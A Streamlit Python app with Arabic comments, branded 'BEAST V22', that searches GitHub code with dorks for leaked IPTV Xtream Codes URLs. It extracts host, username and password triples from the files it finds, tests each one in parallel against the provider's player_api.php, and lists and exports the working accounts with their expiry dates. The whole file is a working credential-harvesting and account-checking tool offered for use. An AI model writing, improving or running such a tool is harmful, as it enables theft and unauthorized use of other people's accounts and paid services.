import streamlit as st
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. نظام الدخول والهوية
# =================================================
if "auth" not in st.session_state: st.session_state.auth = False

def login():
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V22 - THE FLOOD</h1>", unsafe_allow_html=True)
    p = st.text_input("ادخل كلمة السر القوية:", type="password")
    if st.button("تفعيل الوحش"):
        if p == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
        else: st.error("❌ الباسورد غلط يا بطل")

if not st.session_state.auth: login(); st.stop()

st.set_page_config(page_title="V22 Flood Edition", layout="wide")

# تنسيق "الهكرز" المتقدم
st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .log-entry { 
        color: #00ff41; font-family: 'Courier New'; font-size: 14px; 
        border-bottom: 1px solid #111; padding: 5px;
    }
    .hit-box {
        background: #0d1117; border-left: 10px solid #00ff41;
        padding: 15px; margin: 10px 0px; border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0,255,65,0.1);
    }
    .host-text { color: #58a6ff; font-weight: bold; font-size: 16px; }
    .user-text { color: #fbbf24; }
    .exp-text { color: #ff7b72; font-style: italic; }
</style>
""", unsafe_allow_html=True)

# إدارة البيانات
if 'all_hits' not in st.session_state: st.session_state.all_hits = []
if 'is_active' not in st.session_state: st.session_state.is_active = False
if 'stats' not in st.session_state: st.session_state.stats = {"scanned": 0, "hits": 0}

# =================================================
# 2. محرك الفحص الذري (Atom Checker)
# =================================================
def check_engine(server_data):
    h, u, p = server_data
    try:
        # فحص سريع جداً (3 ثواني فقط لكل سيرفر)
        api = f"{h}/player_api.php?username={u}&password={p}"
        r = requests.get(api, timeout=3).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            return {"h": h, "u": u, "p": p, "exp": exp, "con": f"{info.get('active_cons', '0')}/{info.get('max_connections', '1')}"}
    except: pass
    return None

# =================================================
# 3. لوحة التحكم الجانبية
# =================================================
with st.sidebar:
    st.image("https://cdn-icons-png.flaticon.com/512/2592/2592170.png", width=80)
    st.title("BEAST V22")
    gh_token = st.text_input("GitHub Token:", type="password", placeholder="ضع التوكن هنا...")
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 بدء الفيضان"):
            if gh_token: st.session_state.is_active = True; st.rerun()
    with col2:
        if st.button("🛑 إيقاف"):
            st.session_state.is_active = False; st.rerun()

    st.divider()
    st.metric("✅ النتائج الشغالة", st.session_state.stats["hits"])
    st.metric("🔍 إجمالي الفحص", st.session_state.stats["scanned"])
    
    if st.session_state.all_hits:
        export_txt = "\n".join([f"HOST: {x['h']} | USER: {x['u']} | PASS: {x['p']}" for x in st.session_state.all_hits])
        st.download_button("📥 تحميل كل النتائج", export_txt, "Beast_Flood_Results.txt")

# =================================================
# 4. منطقة العرض المباشر (LIVE STREAM)
# =================================================
st.subheader("📡 بث مباشر للفحص والصيد")
radar_log = st.empty() # منطقة عرض الفحص الحالي
hits_area = st.container() # منطقة النتائج تحت بعضها

# عرض النتائج الموجودة مسبقاً
with hits_area:
    for hit in st.session_state.all_hits:
        st.markdown(f"""
        <div class="hit-box">
            <div class="host-text">🌐 {hit['h']}</div>
            <span class="user-text">👤 User: {hit['u']}</span> | 
            <span class="user-text">🔑 Pass: {hit['p']}</span><br>
            <span class="exp-text">📅 Expiry: {hit['exp']}</span> | 
            <span style="color:#00ff41;">🔌 Connections: {hit['con']}</span>
        </div>
        """, unsafe_allow_html=True)

# تشغيل عملية "الفيضان" المليونية
if st.session_state.is_active:
    headers = {'Authorization': f'token {gh_token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # دوركات هجومية لجلب ملايين الروابط
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'filename:xtream_codes.txt',
        'iptv 2026 xtream',
        '"http://" "username" "password" "port" extension:txt'
    ]

    while st.session_state.is_active:
        for dork in dorks:
            if not st.session_state.is_active: break
            
            for page in range(1, 101): # فحص 100 صفحة لكل دورك
                if not st.session_state.is_active: break
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    response = requests.get(url, headers=headers).json()
                    
                    if "items" not in response:
                        radar_log.warning("⚠️ جيت هاب يحتاج راحة.. سأنتظر 15 ثانية")
                        time.sleep(15); continue

                    for item in response['items']:
                        if not st.session_state.is_active: break
                        raw_link = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            text_content = requests.get(raw_link, timeout=3).text
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", text_content)
                            
                            if matches:
                                # فحص متوازي لـ 20 رابط في المرة الواحدة
                                with ThreadPoolExecutor(max_workers=20) as executor:
                                    results = list(executor.map(check_engine, matches))
                                    
                                    for i, res in enumerate(results):
                                        st.session_state.stats["scanned"] += 1
                                        # عرض الفحص الحالي في الرادار
                                        radar_log.markdown(f"<div class='log-entry'>🔍 جاري فحص: {matches[i][0]}</div>", unsafe_allow_html=True)
                                        
                                        if res:
                                            # بمجرد إيجاد "صيد"، يضاف للقائمة وتتحدث الصفحة فوراً
                                            st.session_state.all_hits.insert(0, res)
                                            st.session_state.stats["hits"] += 1
                                            st.rerun() 
                        except: continue
                except: continue
                time.sleep(0.5)
